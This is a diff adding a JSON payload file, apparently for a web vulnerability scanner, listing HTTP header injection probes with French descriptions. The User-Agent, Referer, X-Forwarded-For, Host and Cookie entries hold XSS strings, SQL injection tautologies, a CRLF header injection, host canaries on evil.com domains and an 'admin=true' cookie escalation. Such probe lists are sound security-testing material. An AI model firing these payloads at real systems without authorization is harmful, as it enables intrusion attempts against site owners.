@@ -1,0 +1,25 @@
+{
+  "family": "header_injection",
+  "version": "1.0.0",
+  "categories": {
+    "user_agent": [
+      {"payload": "Mozilla/5.0 <script>alert(1)</script>",         "type": "xss",  "description": "XSS dans logs/analytics", "confidence_hint": 80, "depth": "basic"},
+      {"payload": "Mozilla/5.0 ' OR 1=1-- ",                       "type": "sqli", "description": "SQLi dans UA stocké en DB", "confidence_hint": 75, "depth": "basic"},
+      {"payload": "Mozilla/5.0\r\nX-Injected: yes",                "type": "crlf", "description": "CRLF injection", "confidence_hint": 70, "depth": "extended"}
+    ],
+    "referer": [
+      {"payload": "https://evil.com/<svg onload=alert(1)>",        "type": "xss",      "description": "XSS via Referer affiché", "confidence_hint": 70, "depth": "basic"},
+      {"payload": "https://evil.example.com",                      "type": "host-injection", "description": "Referer canary", "confidence_hint": 60, "depth": "basic"}
+    ],
+    "x_forwarded_for": [
+      {"payload": "127.0.0.1' OR 1=1-- ",                          "type": "sqli",  "description": "SQLi via IP loggée en DB", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "<svg onload=alert(1)>",                         "type": "xss",   "description": "XSS dans logs admin", "confidence_hint": 70, "depth": "basic"}
+    ],
+    "host": [
+      {"payload": "evil.example.com",                              "type": "host-injection", "description": "Host canary", "confidence_hint": 75, "depth": "basic"}
+    ],
+    "cookie": [
+      {"payload": "admin=true",                                     "type": "privesc", "description": "Privesc via cookie", "confidence_hint": 50, "depth": "extended"}
+    ]
+  }
+}
